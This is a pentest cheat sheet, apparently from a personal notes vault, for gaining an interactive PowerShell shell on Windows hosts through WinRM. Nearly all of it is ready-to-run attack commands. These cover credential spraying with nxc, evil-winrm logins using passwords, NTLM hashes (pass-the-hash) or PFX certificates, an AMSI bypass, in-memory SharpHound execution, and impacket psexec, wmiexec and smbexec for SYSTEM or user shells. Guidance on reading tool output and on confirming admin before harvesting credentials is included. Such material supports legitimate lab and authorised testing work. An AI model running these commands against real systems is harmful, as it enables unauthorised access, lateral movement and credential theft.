## Goal
Get an interactive PowerShell shell with valid creds or an NTLM hash. WinRM(5985/5986) is the go-to shell once you have Windows creds.

> In a domain: validate which users can WinRM here (lockout-aware) → [[01_credentials_and_spraying]]; after a session, harvest creds → [[03_credential_access]] **only once you've confirmed admin in-session** (WinRM `Pwn3d!` alone is not local admin, see Helpline); whole-domain loop → [[00_AD_METHODOLOGY]]; AD service index → [[00_AD_SERVICES]].

**Checklist**
- [ ] have creds or an NTLM hash?
- [ ] user in "Remote Management Users"? (nxc shows Pwn3d!)
- [ ] SSL (5986) / cert (PFX) needed?

# Commands

### Step 1: Check access (look for Pwn3d!)
```bash
nxc winrm $IP -u user -p 'password'
nxc winrm $IP -u user -H <NTLM_hash>
nxc winrm $IP -u users.txt -p 'password' --continue-on-success    # spray
```

### Step 2: Shell (evil-winrm)
```bash
evil-winrm -i $IP -u user -p 'password'
evil-winrm -i $IP -u user -H <NTLM_hash>          # pass-the-hash
evil-winrm -i $IP -u user -p 'password' -S        # SSL (5986)
```

### Step 3: Certificate (PFX) auth
```bash
openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in cert.pfx -nokeys  -out cert.pem
evil-winrm -i $IP -c cert.pem -k key.pem -S
```

### Step 4: Inside the session
```powershell
upload /path/local/file.exe C:\Users\user\Desktop\file.exe
download C:\Users\user\Desktop\flag.txt /tmp/flag.txt
menu                    # evil-winrm helpers
Bypass-4MSI             # AMSI bypass
Invoke-Binary /opt/tools/SharpHound.exe    # run .NET in memory (start evil-winrm -e /opt/tools)
```

### Step 5: No WinRM but have creds? (SYSTEM/user shells)
```bash
impacket-psexec corp.local/user:password@$IP          # SYSTEM (noisy)
impacket-psexec corp.local/user@$IP -hashes :<NTLM>   # pass-the-hash
impacket-wmiexec corp.local/user:password@$IP         # quieter, user-level
impacket-smbexec corp.local/user:password@$IP
```

### Helpline
```bash
# READING nxc / crackmapexec (WinRM):
#   "Pwn3d!" on WINRM = you can EXECUTE COMMANDS over WinRM (evil-winrm in). It means the user is admin
#     OR just in Remote Management Users -> it is NOT proof of local admin. (Contrast SMB Pwn3d! = most likely admin.)
#   "(+)" but NO Pwn3d! = creds valid but user can't WinRM -> try SMB/RDP with them instead.
#   "(-)" or NT_STATUS_LOGON_FAILURE = wrong cred (the tool works, fix the pair).
#   connection reset/timeout = WinRM disabled/filtered -> pivot to SMB/RDP.
# GETTING THE SHELL: evil-winrm -i $IP -u user -p pass (-H <hash> for pass-the-hash; -S for 5986/TLS).
#   inside, CONFIRM privilege before dumping creds: whoami /groups -> Administrators / High Mandatory Level?
#   a non-admin Remote Management Users member gets a shell but CANNOT read SAM/LSA/LSASS (03_credential_access).
# NO WinRM but you have creds -> impacket-psexec/wmiexec (SMB) for a SYSTEM/user shell (139_445_smb/smb_attacks).
# who's in "Remote Management Users" comes from LDAP memberOf / BloodHound, that's who to target.
```
